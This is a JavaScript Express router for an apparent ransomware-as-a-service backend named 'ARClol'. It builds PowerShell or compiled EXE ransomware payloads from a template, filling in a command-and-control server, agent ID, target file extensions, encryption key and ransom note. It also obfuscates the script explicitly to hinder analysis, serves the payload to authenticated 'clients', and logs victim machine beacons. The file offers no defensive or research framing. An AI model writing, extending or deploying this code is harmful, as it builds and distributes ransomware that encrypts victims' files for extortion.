const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs').promises;
const { v4: uuidv4 } = require('uuid');
const ExeBuilder = require('../exe-builder/builder');
const crypto = require('crypto');

// Middleware for authentication (assuming you have a similar middleware)
const { authenticateToken, requireRole } = require('../middleware/auth');

// Template path for the ransomware PowerShell script
const TEMPLATE_PATH = path.join(__dirname, '../templates/ransomware/template.ps1');

/**
 * Comprehensive obfuscation function to make the PowerShell script harder to analyze
 * @param {string} script - The PowerShell script to obfuscate
 * @returns {string} Obfuscated PowerShell script
 */
function obfuscateScript(script) {
  // Obfuscation techniques:
  // 1. Variable renaming with random names
  // 2. String encoding (Base64)
  // 3. Command substitution
  // 4. Insertion of random comments
  
  // Generate a random variable name
  const generateRandomVarName = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < Math.floor(Math.random() * 10) + 5; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };
  
  // Encode strings using Base64
  const encodeString = (str) => {
    return Buffer.from(str, 'utf8').toString('base64');
  };
  
  // Add random comments to make analysis harder
  const addRandomComments = (script) => {
    const comments = [
      '<# This is a placeholder comment #>',
      '<# Random comment for obfuscation #>',
      '<# Another meaningless comment #>',
      '<# Obfuscation in progress... #>'
    ];
    
    let result = script;
    const lines = result.split('\n');
    const newLines = [];
    
    for (let i = 0; i < lines.length; i++) {
      newLines.push(lines[i]);
      // Randomly insert comments (20% chance per line)
      if (Math.random() < 0.2) {
        const randomComment = comments[Math.floor(Math.random() * comments.length)];
        newLines.push(randomComment);
      }
    }
    
    return newLines.join('\n');
  };
  
  // Rename common variables with random names
  let obfuscatedScript = script;
  
  // List of common variables to rename
  const commonVars = ['$xzvcv', '$cxzvz', '$vczxv', '$zxcvx'];
  
  // Create mapping of old variable names to new random names
  const varMapping = {};
  commonVars.forEach(varName => {
    varMapping[varName] = generateRandomVarName();
  });
  
  // Replace variable names
  for (const [oldName, newName] of Object.entries(varMapping)) {
    const varRegex = new RegExp(`\\${oldName}`, 'g');
    obfuscatedScript = obfuscatedScript.replace(varRegex, `$${newName}`);
  }
  
  // Add random comments
  obfuscatedScript = addRandomComments(obfuscatedScript);
  
  // Return obfuscated script
  return obfuscatedScript;
}

/**
 * Generate a ransomware payload based on campaign configuration
 * @param {Object} config - Campaign configuration from frontend
 * @returns {string} Generated PowerShell script
 */
async function generateRansomwarePayload(config) {
  try {
    // Read the template file
    let template = await fs.readFile(TEMPLATE_PATH, 'utf8');
    
    // Generate a unique agent ID if not provided
    const agentId = config.agentId || uuidv4();
    
    // Replace placeholders in the template
    template = template.replace(/\$xzvcv = \$null/g, `$xzvcv = "${config.c2Server || 'http://localhost:8080'}"`);
    template = template.replace(/\$cxzvz = \$null/g, `$cxzvz = "${agentId}"`);
    template = template.replace(/\$vczxv = 0/g, `$vczxv = ${config.delay || 30}`);
    
    // Handle user agent if provided
    if (config.userAgent) {
      template = template.replace(/\$zxcvx = \$null/g, `$zxcvx = "${config.userAgent}"`);
    }
    
    // Apply obfuscation if requested
    if (config.obfuscate) {
      template = obfuscateScript(template);
    }
    
    // Add notification parameters if provided (for Fire & Forget mode)
    if (config.notification) {
      // Add notification type, message, and title as PowerShell variables
      const notificationType = config.notification.type || 'popup';
      const notificationMessage = config.notification.message || 'Your files have been encrypted with ARClol ransomware. Contact support for recovery.';
      const notificationTitle = config.notification.title || 'ARClol Ransomware Alert';
      
      // Replace the default notification values in the PowerShell script
      template = template.replace('$script:NotificationType = "popup"', `$script:NotificationType = "${notificationType}"`);
      template = template.replace(
        '$script:NotificationMessage = "Your files have been encrypted with ARClol ransomware. Contact support for recovery."',
        `$script:NotificationMessage = "${notificationMessage.replace(/"/g, '""')}"`
      );
      template = template.replace(
        '$script:NotificationTitle = "ARClol Ransomware Alert"',
        `$script:NotificationTitle = "${notificationTitle.replace(/"/g, '""')}"`
      );
    }
    
    return template;
  } catch (error) {
    throw new Error(`Failed to generate ransomware payload: ${error.message}`);
  }
}

/**
 * POST /api/ransom/build
 * Build a ransomware payload based on campaign configuration
 * Only admins (SA, A) and clients (C) can build ransomware
 */
router.post('/build', authenticateToken, requireRole(['SA', 'A', 'C']), async (req, res) => {
  try {
    const campaignConfig = req.body;
    
    // Validate required fields
    if (!campaignConfig.name) {
      return res.status(400).json({ error: 'Campaign name is required' });
    }
    
    if (!campaignConfig.payloadType) {
      return res.status(400).json({ error: 'Payload type is required' });
    }
    
    // Determine output format
    const outputFormat = campaignConfig.outputFormat || 'ps1';
    const filename = outputFormat === 'exe' ? `${campaignConfig.name}.exe` : `${campaignConfig.name}.ps1`;
    
    let payload;
    
    if (outputFormat === 'exe') {
      // Build executable using ExeBuilder
      console.log('Building executable payload...');
      const exeBuilder = new ExeBuilder();
      
      // Convert campaign config to exe builder format
      const exeConfig = {
        c2Server: campaignConfig.c2Server || 'http://localhost:3001',
        agentId: campaignConfig.agentId || uuidv4(),
        machineId: campaignConfig.machineId || uuidv4(),
        encryptionKey: campaignConfig.encryptionKey || crypto.randomBytes(32).toString('hex'),
        targetExtensions: campaignConfig.targetExtensions || ['.txt', '.doc', '.pdf'],
        excludePaths: campaignConfig.excludePaths || ['C:\\Windows', 'C:\\Program Files'],
        maxFileSize: campaignConfig.maxFileSize || 100 * 1024 * 1024,
        ransomNote: campaignConfig.ransomNote || 'Your files have been encrypted!',
        outputFormat: 'exe',
        buildDir: path.join(__dirname, '..', 'exe-builder', 'build'),
        compiler: 'gcc',
        optimizationLevel: 2
      };
      
      payload = await exeBuilder.buildExecutable(exeConfig, 'exe');
      
    } else {
      // Generate PowerShell payload
      payload = await generateRansomwarePayload(campaignConfig);
    }
    
    // Return the payload as a file download
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.send(payload);
    return;
  } catch (error) {
    console.error('Error building ransomware payload:', error);
    res.status(500).json({ 
      error: 'Failed to build ransomware payload',
      message: error.message 
    });
  }
});

/**
 * POST /api/ransom/beacon
 * One-time beacon endpoint for ransomware payload logging
 * Receives execution notification from ransomware payload
 */
router.post('/beacon', async (req, res) => {
  try {
    const { agent_id, machine_id, timestamp, event } = req.body;
    
    if (!agent_id || !machine_id || !event) {
      return res.status(400).json({ 
        error: 'Missing required fields: agent_id, machine_id, and event are required' 
      });
    }
    
    // Log the beacon event
    console.log(`[RANSOMWARE BEACON] Agent: ${agent_id}, Machine: ${machine_id}, Event: ${event}, Timestamp: ${timestamp}`);
    
    // Store beacon data for dashboard display
    // In production, this would be stored in a database
    const beaconData = {
      agent_id,
      machine_id,
      event,
      timestamp: timestamp || new Date().toISOString(),
      received_at: new Date().toISOString(),
      ip_address: req.ip || req.connection.remoteAddress
    };
    
    // For now, just log it - in production you'd store this
    console.log('[BEACON DATA]', beaconData);
    
    res.status(200).json({ 
      success: true,
      message: 'Beacon received successfully',
      received: beaconData
    });
    
  } catch (error) {
    console.error('Error processing beacon:', error);
    res.status(500).json({ 
      error: 'Failed to process beacon',
      message: error.message 
    });
  }
});

module.exports = router;
